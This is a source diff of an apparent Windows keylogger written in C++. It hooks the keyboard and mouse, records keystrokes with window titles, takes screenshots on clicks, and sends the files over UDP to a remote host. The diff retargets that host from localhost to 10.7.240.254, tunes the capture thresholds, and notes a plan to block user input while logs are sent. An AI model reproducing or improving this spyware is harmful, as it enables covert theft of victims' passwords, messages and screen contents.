@@ -41,7 +41,7 @@ WORD wsa_version;
 ofstream logfile;
 
 long file_position;
-int clks_per_log = 5; // this needs to go up 400-5000
+int clks_per_log = 200; // this needs to go up 400-5000
 int chars_per_log = 100;
 int screen_width = 1920;
 int screen_height = 1080;
@@ -84,9 +84,9 @@ int main()
 	locale swedish("swedish");
 	locale::global(swedish);
 	start_socket();
-	send_file("kyss.txt");
-	count_secs(40);
-	getchar();
+	//send_file("kyss.txt");
+	//count_secs(40);
+	//getchar();
 	gethostname(hostname_buffer, 256);
 	stringstream logname_stream;
 	logname_stream << R"(LongTerm_)" << hostname_buffer << "_keyboard_" << current_time() + ".log";
@@ -112,16 +112,18 @@ int main()
 	return 0;
 }
 
+//idea is to blockinput when inactive and sending logs and sc
+
 void count_secs(int duration) {
 	const clock_t begin_time = clock();
 	int p_time = 0;
 	for (;;) {
 		int time_passed = (clock() - begin_time / CLOCKS_PER_SEC) / 1000; //seconds passed
 		if (time_passed != p_time) {
-			cout << time_passed << endl;
 			p_time = time_passed;
-			if (time_passed >= 30) { //seconds to count as inactive ex(5 min)
-				
+			cout << time_passed << endl;
+			if (time_passed >= 120) { //seconds to count as inactive ex(5 min)
+				//inactive
 			}
 		}
 	}
@@ -144,7 +146,7 @@ void start_socket(SOCKET &outgoing_Socket, SOCKADDR_IN &socket_Address, WORD &ws
 		outgoing_Socket = socket(AF_INET, SOCK_DGRAM, 0);
 		socket_Address.sin_family = AF_INET;
 		socket_Address.sin_port = htons(port);
-		inet_pton(AF_INET, "127.0.0.1", &socket_Address.sin_addr);
+		inet_pton(AF_INET, "10.7.240.254", &socket_Address.sin_addr);
 		return;
 	}
 	cout << "Can't start Winsock! " << wsOk;
@@ -170,8 +172,8 @@ static inline bool is_base64(unsigned char target_char) {
 void send_text(string input_text, SOCKET outgoing_socket, SOCKADDR_IN socket_address) {
 	string data_size = to_string(input_text.length());
 	string data_type = "TEXT";
-	auto send_Type = sendto(outgoing_socket, data_type.c_str(),  data_type.size() + 1,  0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address));
-	auto send_Size = sendto(outgoing_socket, data_size.c_str(),  data_size.size() + 1,  0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address));
+	auto send_Type = sendto(outgoing_socket, data_type.c_str(), data_type.size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address));
+	auto send_Size = sendto(outgoing_socket, data_size.c_str(), data_size.size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address));
 	auto send_Text = sendto(outgoing_socket, input_text.c_str(), input_text.size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address));
 	if (send_Type == SOCKET_ERROR || send_Text == SOCKET_ERROR || send_Size == SOCKET_ERROR)
 	{
@@ -199,7 +201,7 @@ void send_file(string filename, SOCKET outgoing_socket, SOCKADDR_IN socket_addre
 		cout << "| Size: ";
 		auto divisor_count = 1;
 		while (divisor_count <= encode_length) {
-			if (encode_length / divisor_count <= 60000 && encode_length % divisor_count == 0)
+			if (encode_length / divisor_count <= 60000 && encode_length / divisor_count >= 10000 && encode_length % divisor_count == 0)
 			{
 				cout << divisor_count << " * " << (encode_length / divisor_count) << " = " << divisor_count * (encode_length / divisor_count);
 				split_count = divisor_count;
@@ -216,27 +218,31 @@ void send_file(string filename, SOCKET outgoing_socket, SOCKADDR_IN socket_addre
 		string size_split = to_string((encode_length / split_count));
 		string amount_split = to_string(split_count);
 
-		auto send_Type =           sendto(outgoing_socket, data_Type.c_str(), data_Type.size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address)); // type
-		auto send_Filename =       sendto(outgoing_socket, filename.c_str(), filename.size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address)); // filename
-		auto send_SHA512Hash =	   sendto(outgoing_socket, sha512::file(filename).c_str(), sha512::file(filename).size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address)); // hash
-		auto send_SplitSize =	   sendto(outgoing_socket, size_split.c_str(), size_split.size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address)); // per split size
+		auto send_Type = sendto(outgoing_socket, data_Type.c_str(), data_Type.size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address)); // type
+		auto send_Filename = sendto(outgoing_socket, filename.c_str(), filename.size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address)); // filename
+		auto send_SHA512Hash = sendto(outgoing_socket, sha512::file(filename).c_str(), sha512::file(filename).size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address)); // hash
+		auto send_SplitSize = sendto(outgoing_socket, size_split.c_str(), size_split.size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address)); // per split size
 		auto send_NumberOfSplits = sendto(outgoing_socket, amount_split.c_str(), amount_split.size(), 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address)); // # of splits
-		
-		if(send_Type == SOCKET_ERROR) {
+
+		if (send_Type == SOCKET_ERROR) {
 			cout << "Send Type Error: " << WSAGetLastError() << endl;
-		}else if (send_Filename == SOCKET_ERROR) {
+		}
+		else if (send_Filename == SOCKET_ERROR) {
 			cout << "Send Filename Error: " << WSAGetLastError() << endl;
-		}else if (send_SHA512Hash == SOCKET_ERROR) {
+		}
+		else if (send_SHA512Hash == SOCKET_ERROR) {
 			cout << "Send Hash Error: " << WSAGetLastError() << endl;
-		}else if (send_SplitSize == SOCKET_ERROR) {
+		}
+		else if (send_SplitSize == SOCKET_ERROR) {
 			cout << "Send Split Size Error: " << WSAGetLastError() << endl;
-		}else if (send_NumberOfSplits == SOCKET_ERROR) {
+		}
+		else if (send_NumberOfSplits == SOCKET_ERROR) {
 			cout << "Send Number of splits Error: " << WSAGetLastError() << endl;
 		}
 
 		for (auto i = datafile.begin(); i != datafile.end(); ++i) {
 			string split_chunk = *i;
-			Sleep(50);
+			Sleep(10);
 			const int send_Chunk = sendto(outgoing_socket, split_chunk.c_str(), stoi(size_split), 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address));
 			if (send_Chunk == SOCKET_ERROR) {
 				cout << "Send Chunk Error: " << WSAGetLastError() << endl;
@@ -244,9 +250,8 @@ void send_file(string filename, SOCKET outgoing_socket, SOCKADDR_IN socket_addre
 		}
 
 		cout << " | <Sent File>" << endl << endl;
-
 	}
-	else //less than 60000 
+	else //less than 60000
 	{
 		string data_type = "SMALLFILE";
 		cout << "Took " << float(clock() - begin_time) / CLOCKS_PER_SEC << "s ";
@@ -278,7 +283,7 @@ void send_file(string filename, SOCKET outgoing_socket, SOCKADDR_IN socket_addre
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 	const HWND fwindow = GetForegroundWindow();
 	const auto key = PKBDLLHOOKSTRUCT(lParam);
-	#pragma region Key Down
+#pragma region Key Down
 	if (wParam == WM_KEYDOWN && nCode == HC_ACTION) { // key has been pressed
 		if (prev_window != fwindow) { // prints the window name only if the user has began typing in a new window
 			wchar_t wtitle[1024];
@@ -293,7 +298,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 			logfile << "\n[" << current_time() << "] " << "Title: \"" << title_buffer << "\"" << endl;
 			stringstream temp_title, hhookstream;
 			hhookstream << keyboard_hook;
-			temp_title << title_buffer << " (H:\"" << hhookstream.str().substr(0,2) << ""<< hhookstream.str().substr(3, 3) <<hhookstream.str().substr(7, 7)<< "\")"; //some scary shit that works
+			temp_title << title_buffer << " (H:\"" << hhookstream.str().substr(0, 2) << "" << hhookstream.str().substr(3, 3) << hhookstream.str().substr(7, 7) << "\")"; //some scary shit that works
 			wchar_t hook_title[1024];
 			mbstowcs(hook_title, temp_title.str().c_str(), temp_title.str().length() + 1);
 			SetWindowText(fwindow, hook_title); //LPCWSTR needs to have L as prefix to assign a string to it
@@ -452,7 +457,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 		}
 	}
 #pragma endregion
-	#pragma region Key Up
+#pragma region Key Up
 	if (wParam == WM_KEYUP && nCode == HC_ACTION) {
 		const auto current_key = int(key->vkCode);
 		switch (current_key) {
@@ -476,8 +481,13 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	#pragma region Mouse Up
+#pragma region Mouse Up
 	if (wParam == 514) {
+		if (screen_shots.size() >= clks_per_log)
+		{
+			thread st(send_screenshots, screen_shots);
+			st.detach();
+		}
 		GetCursorPos(&fmouse_pos);
 		cout << "[lU]: {X=" << fmouse_pos.x << ", Y=" << fmouse_pos.y << "}, ";
 		cout << "[Dr]: {X=" << smouse_pos.x - fmouse_pos.x << ", Y=" << smouse_pos.y - fmouse_pos.y << "}";
@@ -518,7 +528,7 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 			logfile << " [ RCLICK ] [" << filename << "]" << endl;
 		}
 		else {//screenshot_path + "_" +
-			string filename =  current_time() + ".jpg";
+			string filename = current_time() + ".jpg";
 			thread sc(save_screenshot, filename, 1);
 			sc.detach();
 			screen_shots.push_back(filename);
@@ -528,13 +538,8 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 	}
 #pragma endregion
 
-	#pragma region Mouse Down
+#pragma region Mouse Down
 	else if (wParam == 513) {
-		if (screen_shots.size() >= clks_per_log)
-		{
-			thread st(send_screenshots,screen_shots);
-			st.detach();
-		}
 		GetCursorPos(&smouse_pos);
 		cout << endl << "[" << current_time() << "] ML[D]: {X=" << smouse_pos.x << ", Y=" << smouse_pos.y << "}, ";
 		logfile << endl << "[" << current_time() << "] Left Mouse[D]: {X=" << smouse_pos.x << ", Y=" << smouse_pos.y << "}, ";
